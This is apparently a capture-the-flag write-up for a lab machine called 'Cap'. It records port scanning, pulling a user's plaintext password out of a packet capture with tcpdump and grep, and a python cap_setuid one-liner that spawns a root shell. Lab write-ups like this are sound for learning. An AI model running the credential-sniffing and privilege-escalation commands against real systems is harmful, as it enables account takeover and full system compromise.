# Cap

## Nmap

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
```

## Fast and failed

- searchsploit vsftp v3.0.3: nothing
- bruteforcing ftp with default credentials: nothing

## Website

> Logged in as `Nathan`

Most likely the FTP / OS login too.

### Notifications

There's an offset panel with notifications and settings. Tweaking the css
brings it back into view:

```css
.offset-area{
	right: 0;
}
```

There's a notification about a failed login

> You missed you Password!
> 09:20 Am

### Network activity

Let's go through the network logs looking for the login attempts:

```bash
tcpdum -r ~/downloads/0.pcap -XX -A | grep -ia login
```

> nathan
> Buck3tH4TF0RM3!

The credentials work with ssh, golden!

## Escalation

`linpeas` tells us that python has `cap_setuid`!

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
